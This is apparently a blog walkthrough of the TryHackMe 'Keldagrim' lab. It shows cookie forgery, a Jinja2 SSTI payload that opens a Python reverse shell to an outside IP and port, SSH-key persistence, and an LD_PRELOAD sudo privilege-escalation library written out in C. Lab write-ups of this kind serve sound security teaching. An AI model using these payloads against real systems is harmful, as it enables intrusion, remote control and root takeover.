---
title: "TryHackMe Keldagrim Walkthrough"
date: 2026-02-03
tags:
  - tryhackme
  - ctf
  - medium
  - Application Security
  - walkthrough
  - SSTI
draft: false
cover:
  image: images/keldagrim.png
  alt: This is Thumbnail
  caption: ' '
---

We gonna start with NMAP scan:

![](Pasted%20image%2020260203100646.png)

Even if it is showing that these ports are filtered we are going to check it by visiting the website on port 80.

add the IP to the `/etc/hosts`.

okay we can visit the website and we can see that there multiple things listed on the website, from that we can enumerate more on the directories.

![](Pasted%20image%2020260203100904.png)

upon seeing the website, there is `/admin` which is greyed out and visiting it isn't showing anything.

so lets take this  to burp suite.

![](Pasted%20image%2020260203102948.png)

upon looking at the website cookies and the panel on the right,

we can see the the cookie was double encoded with `base64` and the decoded version of it is `guest`.

![](Pasted%20image%2020260203103204.png)
lets change the `guest` to `admin` in inspector panel and paste the base64 to the cookies. which translates to 

`YWRtaW4=`

so lets change the cookie value in local storage to prevent it from resetting on every refresh.

![](Pasted%20image%2020260203105450.png)

so now here you can see the sales value is also encoded in base64, by decoding it we get 

`SkRJc01UWTE=` 

![](Pasted%20image%2020260203110136.png)

we get the sales value which is shown on website.

we can easily change it and get rich!!


![](Pasted%20image%2020260203110715.png)


you can see we changed the sales cookie value and the amount also changed.

what if we try the SSTI on this cookie value by encoding the payload in base64.

we have encoded `{{7*7}}`  to  `e3s3Kjd9fQ==`.

lets check now:

![](Pasted%20image%2020260203111233.png)

and you can see the value changed to `49`.

![](SSTI%20Template%20decision%20tree%201.png)

you can refer this to find out the template engine.

we can find out by this decision tree, that we are dealing with Jinja2, and our decision is stronger as the server is werkzug. 

you can further follow my learning's of SSTI to get know more about it and exploit this particular machine with that knowledge. [here]()

### User Flag

now we will convert all our normal commands of SSTI to base64 before entering the payload.

`{{ ''.__class__.__mro__ }}` to `e3sgJycuX19jbGFzc19fLl9fbXJvX18gfX0=`

nothing interesting we got here.

so i used 

```shell

echo "{{get_flashed_messages.__class__.__mro__[1].__subclasses__()}}" | base64

e3tnZXRfZmxhc2hlZF9tZXNzYWdlcy5fX2NsYXNzX18uX19tcm9fX1sxXS5fX3N1YmNsYXNzZXNf
XygpfX0K
```

![](Pasted%20image%2020260203120035.png)

And we got this, this is goldmine.

to find the pid of `.popen`

```shell

echo "/{{‘’.__class__.__mro__[1].__subclasses__()[284:]}}=" | base64

e3vigJjigJkuX19jbGFzc19fLl9fbXJvX19bMV0uX19zdWJjbGFzc2VzX18oKVsyODQ6XX19Cg==
```

we will use this,

again didn't find anything useful,

![](Pasted%20image%2020260203123009.png)
we are going to use this for this [repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---remote-command-execution)

but we will tweak it in our own way

```shell
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.138.111\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

```base64
eyUgZm9yIHggaW4gKCkuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiAid2FybmluZyIgaW4geC5fX25hbWVfXyAlfXt7eCgpLl9tb2R1bGUuX19idWlsdGluc19fWydfX2ltcG9ydF9fJ10oJ29zJykucG9wZW4oInB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKFwiMTkyLjE2OC4xMzguMTExXCIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoW1wiL2Jpbi9iYXNoXCIsIFwiLWlcIl0pOyciKS5yZWFkKCkuemZpbGwoNDE3KX19eyVlbmRpZiV9eyUgZW5kZm9yICV9
```

And this got us reverse shell.

![](Pasted%20image%2020260203143439.png)

### Persistence

We will try to get persistent SSH connection now.

`add ssh key to .ssh/authorized_keys`

```shell
jed@ip-10-49-137-136:~$ mkdir .ssh
mkdir .ssh
jed@ip-10-49-137-136:~$ cd .ssh
cd .ssh
jed@ip-10-49-137-136:~/.ssh$ echo "Your ssh key" >> authorized_keys
```

![](Pasted%20image%2020260203144903.png)

and here we got the persistent connection

### Root Flag

let's see what `jed` has to do for root permissions `sudo -l`.

![](Pasted%20image%2020260203145043.png)

we can see `/bin/ps` which will only help us for execution of the command for priv esc.

the main thing here to notice is `env_keep+=LD_PRELOAD`

`LD_PRELOAD` is a very powerful environment variable which tells helps the admins to create shared library and also the standard C library.

it should not be in the `/etc/sudoers` with the env_keep.

And here it is exploitable for priv esc.

refer [this](https://www.bordergate.co.uk/ld_preload-exploitation/) for priv esc and more ways to exploit this vulnerability.

```c
#include <stdio.h>

#include <sys/types.h>

#include <stdlib.h>

void _init() {

        unsetenv("LD_PRELOAD");

        setresuid(0,0,0);

        system("/bin/bash -p");

}
```

save this as `privesc.so`

```shell
gcc -fPIC -shared -nostartfiles -o privesc.so privesc.c

sudo LD_PRELOAD=/home/jed/privesc.so /bin/ps
```


![](Pasted%20image%2020260203153255.png)

BOOM! we got the `root.txt` flag.


This was really something new for me too, but my own SSTI guide helped me a lot in enumerating the  template. I'll be posting it soon.


